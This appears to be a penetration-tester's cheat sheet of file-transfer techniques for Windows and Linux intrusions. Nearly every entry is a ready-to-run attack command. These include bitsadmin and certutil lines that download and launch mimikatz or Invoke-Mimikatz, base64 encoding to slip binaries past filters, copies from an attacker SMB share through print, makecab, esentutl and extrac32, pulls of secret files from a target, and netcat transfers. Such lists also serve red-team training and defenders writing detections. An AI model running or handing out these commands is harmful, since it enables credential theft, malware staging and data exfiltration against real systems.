# Ultimate File Transfer List
Ultimate File Transfer List


## bitsadmin.exe

cmd.exe /c "bitsadmin.exe /transfer downld_job /download /priority high http://www.trustedsite.com C:\Temp\mimikatz.exe & start C:\Temp\mimikatz.exe"

References: 

https://www.greyhathacker.net/?tag=download-and-execute


## SSH / pscp.exe

pscp.exe C:\Users\Public\info.txt phineas@target:/tmp/info.txt
pscp.exe phineas@target:/home/phineas/secret.txt C:\Users\Public\secret.txt


## certutil.exe

certutil.exe -urlcache -split -f https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1

References:

https://twitter.com/subtee/status/888122309852016641?lang=en


## certutil.exe / base64 transfer

certutil.exe -encode mimikatz.exe mimikatz.txt
certutil.exe -decode mimikatz.txt mimikatz.exe


## print.exe download

C:\Windows\System32\print.exe /D c:\TEMP\ADExplorer.exe \\live.sysinternals.com\tools\ADExplorer.exe

References:

https://twitter.com/Oddvarmoe/status/984749424395112448


## makecab.exe

C:\Windows\System32\makecab.exe \\10.10.10.10\share\nmap.zip C:\Users\Public\nmap.cab


## esentutl.exe

C:\Windows\System32\esentutl.exe /y "\\10.10.10.10\share\mimikatz_trunk.zip" /d"C:\Users\Public\mimikatz_trunk.zip" /o


## extrac32.exe

C:\Windows\System32\extrac32.exe /Y /C \\10.10.10.10\share\secret.txt C:\Users\Public\secret.txt


## netcat file transfer
nc -nlvp 8000 > mimi_incoming.exe
nc -nv 10.10.10.10 8000 </tmp/mimikatz.exe


## Web Browser / Server

python -m SimpleHTTPServer 80
python3 -m http.server
ruby -run -ehttpd . -p80
php -S 0.0.0.0:80
socat TCP-LISTEN:80,reuseaddr,fork


